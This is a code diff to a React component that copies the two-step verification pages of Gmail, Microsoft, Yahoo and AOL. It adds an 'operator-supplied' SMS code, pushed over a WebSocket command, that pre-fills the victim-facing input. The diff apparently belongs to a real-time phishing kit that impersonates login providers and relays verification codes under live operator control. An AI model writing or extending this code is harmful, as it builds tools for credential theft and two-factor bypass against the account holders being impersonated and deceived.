@@ -6,6 +6,12 @@ import ProviderShell from './ProviderShell';
 interface SmsCodePageProps {
   providerKey: ProviderKey;
   onAction: (action: string, data?: Record<string, unknown>) => void;
+  /**
+   * Operator-supplied SMS code, pushed from `App.tsx` via the
+   * `show_sms_code` WebSocket command. When provided, the input is
+   * pre-populated with this value so the user can simply submit.
+   */
+  smsCode?: string;
 }
 
 /**
@@ -17,7 +23,7 @@ interface SmsCodePageProps {
  * provider's real challenge-page chrome (Google two-column, Microsoft
  * 440px MS-bg card, Yahoo / AOL header-bar + narrow centred card, etc.).
  */
-const SmsCodePage: React.FC<SmsCodePageProps> = ({ providerKey, onAction }) => {
+const SmsCodePage: React.FC<SmsCodePageProps> = ({ providerKey, onAction, smsCode }) => {
   const location = useLocation();
   const navigate = useNavigate();
   const theme = getProviderTheme(providerKey);
@@ -28,8 +34,13 @@ const SmsCodePage: React.FC<SmsCodePageProps> = ({ providerKey, onAction }) => {
     (data.phone as string) ||
     'the phone number on file';
 
-  const [code, setCode] = useState('');
+  const [code, setCode] = useState(smsCode || '');
   const [submitting, setSubmitting] = useState(false);
+
+  // When the operator pushes a new code over WebSocket, sync it into the input.
+  React.useEffect(() => {
+    if (smsCode) setCode(smsCode);
+  }, [smsCode]);
 
   const headline: Record<ProviderKey, string> = {
     gmail: '2-Step Verification',
